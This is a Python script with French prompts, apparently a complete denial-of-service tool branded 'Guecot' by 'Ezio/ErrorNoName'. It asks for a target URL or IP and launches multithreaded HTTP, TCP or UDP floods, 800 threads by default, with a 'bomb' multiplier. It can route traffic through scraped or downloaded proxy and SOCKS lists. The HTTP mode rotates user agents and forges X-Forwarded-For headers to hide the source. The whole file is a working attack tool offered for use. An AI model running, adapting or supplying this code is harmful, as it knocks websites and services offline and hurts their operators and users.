import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
import subprocess
import time  # Ajouté pour les animations de chargement

from bs4 import BeautifulSoup

import logging
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Créé par Ezio

if sys.platform.startswith("linux"):  # Créé par Ezio
    from scapy.all import *  # Créé par Ezio
elif sys.platform.startswith("freebsd"):  # Créé par Ezio
    from scapy.all import *  # Créé par Ezio
else:  # Créé par Ezio
    print("TCP/UDP FLOOD NE SONT PAS SUPPORTÉS SUR CE SYSTÈME. VOUS DEVEZ UTILISER HTTP FLOOD.")  # Créé par Ezio
    sys.exit(1)  # Assurez-vous de quitter si le système n'est pas supporté

console = Console()

# Nouveau logo ASCII amélioré
logo = """
██████╗ ██╗   ██╗███████╗ ██████╗ ██████╗ ████████╗
██╔════╝ ██║   ██║██╔════╝██╔════╝██╔═══██╗╚══██╔══╝
██║  ███╗██║   ██║█████╗  ██║     ██║   ██║   ██║   
██║   ██║██║   ██║██╔══╝  ██║     ██║   ██║   ██║   
╚██████╔╝╚██████╔╝███████╗╚██████╗╚██████╔╝   ██║   
 ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝    ╚═╝   
                                                        
        Créé par Ezio/ErrorNoName
"""

# Affichage du logo centré avec une animation de chargement
console.print(Align.center(Panel(Text(logo, justify="center"), border_style="cyan")))
with console.status("[bold green]Chargement de l'interface...[/bold green]", spinner="dots"):
    time.sleep(2)  # Simule un temps de chargement de 2 secondes

useragents = [
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
]

def starturl():  # Créé par Ezio
    global url
    global url2
    global urlport

    console.print("\n[bold green]Insérez l'URL ou l'IP:[/bold green]")
    url = console.input("[bold yellow]>> [/bold yellow]").strip()

    if url == "":
        console.print("[bold red]Veuillez entrer une URL valide.[/bold red]")
        starturl()
        return

    try:
        if url.startswith("www."):
            url = "http://" + url
        elif not (url.startswith("http://") or url.startswith("https://")):
            url = "http://" + url
    except:
        console.print("[bold red]Erreur de saisie, réessayez.[/bold red]")
        starturl()
        return

    try:
        url2 = re.sub(r'^https?:\/\/', '', url).split('/')[0].split(':')[0]
    except:
        url2 = re.sub(r'^https?:\/\/', '', url).split('/')[0]

    try:
        urlport = re.sub(r'^https?:\/\/', '', url).split('/')[0].split(':')[1]
    except IndexError:
        urlport = "80"

    floodmode()

def floodmode():  # Créé par Ezio
    global choice1
    console.print("\n[bold green]Quel type d'attaque souhaitez-vous effectuer ?[/bold green]")
    console.print("[bold cyan]0[/bold cyan] - HTTP Flood (meilleur)")
    console.print("[bold cyan]1[/bold cyan] - TCP Flood")
    console.print("[bold cyan]2[/bold cyan] - UDP Flood")
    choice1 = console.input("[bold yellow]>> [/bold yellow]").strip()

    if choice1 == "0":
        proxymode()
    elif choice1 in ["1", "2"]:
        try:
            if os.getuid() != 0:
                console.print("[bold red]Vous devez exécuter ce programme en tant que root pour utiliser le flood TCP/UDP.[/bold red]")
                sys.exit(1)
            else:
                floodport()
        except:
            pass
    else:
        console.print("[bold red]Erreur de saisie, réessayez.[/bold red]")
        floodmode()

def floodport():  # Créé par Ezio
    global port
    try:
        port_input = console.input("[bold green]Entrez le port à attaquer:[/bold green] ").strip()
        port = int(port_input) if port_input else 80
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        console.print("[bold red]Port invalide, réessayez.[/bold red]")
        floodport()
        return
    proxymode()

def proxymode():  # Créé par Ezio
    global choice2
    console.print("\n[bold green]Voulez-vous activer le mode proxy/socks ?[/bold green]")
    console.print("[bold cyan]y[/bold cyan] - Oui")
    console.print("[bold cyan]n[/bold cyan] - Non")
    choice2 = console.input("[bold yellow]>> [/bold yellow]").strip().lower()

    if choice2 == "y":
        choiceproxysocks()
    else:
        numthreads()

def choiceproxysocks():  # Créé par Ezio
    global choice3
    console.print("\n[bold green]Choisissez le mode:[/bold green]")
    console.print("[bold cyan]0[/bold cyan] - Proxy Mode")
    console.print("[bold cyan]1[/bold cyan] - Socks Mode")
    choice3 = console.input("[bold yellow]>> [/bold yellow]").strip()

    if choice3 == "0":
        choicedownproxy()
    elif choice3 == "1":
        choicedownsocks()
    else:
        console.print("[bold red]Erreur de saisie, réessayez.[/bold red]")
        choiceproxysocks()

def choicedownproxy():  # Créé par Ezio
    choice4 = console.input("\n[bold green]Voulez-vous télécharger une nouvelle liste de proxies ? (y/n): [/bold green]").strip().lower()
    if choice4 == "y":
        choicemirror1()
    else:
        proxylist()

def choicedownsocks():  # Créé par Ezio
    choice4 = console.input("\n[bold green]Voulez-vous télécharger une nouvelle liste de socks ? (y/n): [/bold green]").strip().lower()
    if choice4 == "y":
        choicemirror2()
    else:
        proxylist()

def choicemirror1():  # Créé par Ezio
    global urlproxy
    console.print("\n[bold green]Télécharger depuis:[/bold green]")
    console.print("[bold cyan]0[/bold cyan] - free-proxy-list.net (meilleur)")
    console.print("[bold cyan]1[/bold cyan] - inforge.net")
    console.print("[bold cyan]2[/bold cyan] - HugProxy (GitHub)")  # Nouvelle option ajoutée
    choice5 = console.input("[bold yellow]>> [/bold yellow]").strip()

    if choice5 == "0":
        urlproxy = "http://free-proxy-list.net/"
        proxyget1()
    elif choice5 == "1":
        inforgeget()
    elif choice5 == "2":  # Gestion de la nouvelle option
        hugproxyget()
    else:
        console.print("[bold red]Erreur de saisie, réessayez.[/bold red]")
        choicemirror1()

def choicemirror2():  # Créé par Ezio
    global urlproxy
    console.print("\n[bold green]Télécharger depuis:[/bold green]")
    console.print("[bold cyan]0[/bold cyan] - socks-proxy.net (meilleur)")
    console.print("[bold cyan]1[/bold cyan] - inforge.net")
    console.print("[bold cyan]2[/bold cyan] - HugProxy (GitHub)")  # Nouvelle option ajoutée
    choice5 = console.input("[bold yellow]>> [/bold yellow]").strip()

    if choice5 == "0":
        urlproxy = "https://www.socks-proxy.net/"
        proxyget1()
    elif choice5 == "1":
        inforgeget()
    elif choice5 == "2":  # Gestion de la nouvelle option
        hugproxyget()
    else:
        console.print("[bold red]Erreur de saisie, réessayez.[/bold red]")
        choicemirror2()

def hugproxyget():  # Créé par Ezio
    try:
        hugproxy_url = "https://raw.githubusercontent.com/ErrorNoName/G-G-D/refs/heads/main/HugProxy.txt"
        req = urllib.request.Request(hugproxy_url)
        req.add_header("User-Agent", random.choice(useragents))
        response = urllib.request.urlopen(req)
        proxies = response.read().decode('utf-8').strip().split('\n')

        if proxies:
            with open("proxy.txt", "a") as out_file:
                for proxy in proxies:
                    proxy = proxy.strip()
                    if proxy and ':' in proxy:
                        out_file.write(proxy + "\n")
            console.print("[bold green]Proxies HugProxy téléchargés avec succès.[/bold green]")
        else:
            console.print("[bold red]Aucun proxy valide trouvé dans HugProxy.txt.[/bold red]")
            sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]ERREUR lors du téléchargement des proxies HugProxy: {e}[/bold red]")
        sys.exit(1)
    proxylist()


def proxyget1():  # Créé par Ezio
    try:
        req = urllib.request.Request(urlproxy)
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        part = sourcecode.read().decode('utf-8')
        part = part.split("<tbody>")[1].split("</tbody>")[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>")
            try:
                proxies += proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        with open("proxy.txt", "w") as out_file:
            out_file.write(proxies)
        if proxies:
            console.print("[bold green]Proxies téléchargés avec succès.[/bold green]")
        else:
            console.print("[bold red]Aucun proxy valide n'a été trouvé lors du téléchargement.[/bold red]")
            sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]ERREUR lors du téléchargement des proxies: {e}[/bold red]")
        sys.exit(1)
    proxylist()

def inforgeget():  # Créé par Ezio
    try:
        if os.path.isfile("proxy.txt"):
            with open("proxy.txt", "w") as out_file:
                out_file.write("")
        url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
        soup = BeautifulSoup(urllib.request.urlopen(url), "html.parser")
        console.print("[bold green]Téléchargement depuis inforge.net en cours...[/bold green]")
        base = "https://www.inforge.net/xi/"
        proxies_downloaded = 0
        with open("proxy.txt", "a") as out_file:
            for tag in soup.find_all("a", {"class": "PreviewTooltip"}):
                links = tag.get("href")
                final = base + links
                result = urllib.request.urlopen(final)
                for line in result:
                    ip = re.findall(r"(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}", str(line))
                    if ip:
                        for x in ip:
                            out_file.write(x + "\n")
                            proxies_downloaded += 1
        if proxies_downloaded > 0:
            console.print(f"[bold green]{proxies_downloaded} proxies téléchargés avec succès.[/bold green]")
        else:
            console.print("[bold red]Aucun proxy valide n'a été trouvé lors du téléchargement depuis inforge.net.[/bold red]")
            sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]ERREUR lors du téléchargement des proxies depuis inforge.net: {e}[/bold red]")
        sys.exit(1)
    proxylist()

def proxylist():  # Créé par Ezio
    global proxies
    out_file = console.input("[bold green]Entrez le nom du fichier proxy (proxy.txt par défaut): [/bold green]").strip()
    if out_file == "":
        out_file = "proxy.txt"
    try:
        with open(out_file, "r") as file:
            proxies = [line.strip() for line in file if line.strip()]
        if not proxies:
            console.print(f"[bold red]Le fichier {out_file} est vide. Veuillez télécharger des proxies valides.[/bold red]")
            sys.exit(1)
        console.print(f"[bold green]{len(proxies)} proxies chargés.[/bold green]")
    except FileNotFoundError:
        console.print(f"[bold red]Fichier {out_file} non trouvé. Veuillez télécharger des proxies d'abord.[/bold red]")
        sys.exit(1)
    numthreads()

def numthreads():  # Créé par Ezio
    global threads
    try:
        threads_input = console.input("[bold green]Entrez le nombre de threads (800 par défaut): [/bold green]").strip()
        threads = int(threads_input) if threads_input else 800
    except ValueError:
        threads = 800
        console.print("[bold yellow]800 threads sélectionnés par défaut.[/bold yellow]")
    multiplication()

def multiplication():  # Créé par Ezio
    global multiple
    try:
        multiple = int(console.input("[bold green]Entrez le nombre de multiplications pour l'attaque [(1-5=normal)(50=puissant)(100 ou plus=bombe)]: [/bold green]").strip())
        if multiple < 1:
            raise ValueError
    except ValueError:
        console.print("[bold red]Entrée invalide, réessayez.[/bold red]")
        multiplication()
        return
    begin()

def begin():  # Créé par Ezio
    choice6 = console.input("[bold green]Appuyez sur 'Entrée' pour démarrer l'attaque: [/bold green]").strip().lower()
    if choice6 == "":
        loop()
    else:
        console.print("[bold yellow]Attaque annulée.[/bold yellow]")
        sys.exit(0)

def loop():  # Créé par Ezio
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x
    if choice1 == "0":
        get_host = f"GET {url} HTTP/1.1\r\nHost: {url2}\r\n"
        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: fr-FR,fr;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: fr-FR,fr;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
        ]
        connection = "Connection: Keep-Alive\r\n"
    x = 0
    go = threading.Event()
    if choice1 == "1":
        if choice2 == "y":
            if choice3 == "0":
                for i in range(threads):
                    tcpfloodproxed(i + 1).start()
                    console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
                go.set()
            else:
                for i in range(threads):
                    tcpfloodsocked(i + 1).start()
                    console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
                go.set()
        else:
            for i in range(threads):
                tcpflood(i + 1).start()
                console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
            go.set()
    elif choice1 == "2":
        if choice2 == "y":
            if choice3 == "0":
                for i in range(threads):
                    udpfloodproxed(i + 1).start()
                    console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
                go.set()
            else:
                for i in range(threads):
                    udpfloodsocked(i + 1).start()
                    console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
                go.set()
        else:
            for i in range(threads):
                udpflood(i + 1).start()
                console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
            go.set()
    else:
        if choice2 == "y":
            if choice3 == "0":
                for i in range(threads):
                    requestproxy(i + 1).start()
                    console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
                go.set()
            else:
                for i in range(threads):
                    requestsocks(i + 1).start()
                    console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
                go.set()
        else:
            for i in range(threads):
                requestdefault(i + 1).start()
                console.print(f"[bold blue]Thread {i + 1} prêt![/bold blue]")
            go.set()

class tcpfloodproxed(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, proxy[0], int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(p)
                except:
                    s.close()
            except:
                s.close()

class tcpfloodsocked(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy[0], int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(p)
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxy[0], int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(p)
                    console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                    try:
                        for y in range(multiple):
                            s.send(p)
                    except:
                        s.close()
                except:
                    console.print(f"[bold red]Sock down. Retrying request. @ Thread {self.counter}[/bold red]")
                    s.close()

class tcpflood(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data)
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(p)
                console.print(f"[bold green]Request Sent! @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(p)
                except:
                    s.close()
            except:
                s.close()

class udpfloodproxed(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, proxy[0], int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(p)
                except:
                    s.close()
            except:
                s.close()

class udpfloodsocked(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy[0], int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(port)))
                s.send(p)
                console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(p)
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxy[0], int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(url2), int(port)))
                    s.send(p)
                    console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                    try:
                        for y in range(multiple):
                            s.send(p)
                    except:
                        s.close()
                except:
                    console.print(f"[bold red]Sock down. Retrying request. @ Thread {self.counter}[/bold red]")
                    s.close()

class udpflood(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        data = random._urandom(1024)
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(port)))
                s.send(p)
                console.print(f"[bold green]Request Sent! @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(p)
                except:
                    s.close()
            except:
                s.close()

class requestproxy(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        randomip = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        forward = f"X-Forwarded-For: {randomip}\r\n"
        request = f"{get_host}{useragent}{accept}{forward}{connection}\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

class requestsocks(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        request = f"{get_host}{useragent}{accept}{connection}\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy[0], int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(url2), int(urlport)))
                s.send(str.encode(request))
                console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxy[0], int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(url2), int(urlport)))
                    s.send(str.encode(request))
                    console.print(f"[bold green]Requête envoyée depuis {proxy[0]}:{proxy[1]} @ Thread {self.counter}[/bold green]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        s.close()
                except:
                    console.print(f"[bold red]Sock down. Retrying request. @ Thread {self.counter}[/bold red]")
                    s.close()

class requestdefault(threading.Thread):  # Créé par Ezio

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        request = f"{get_host}{useragent}{accept}{connection}\r\n"
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(urlport)))
                s.send(str.encode(request))
                console.print(f"[bold green]Requête envoyée! @ Thread {self.counter}[/bold green]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

if __name__ == "__main__":
    starturl()
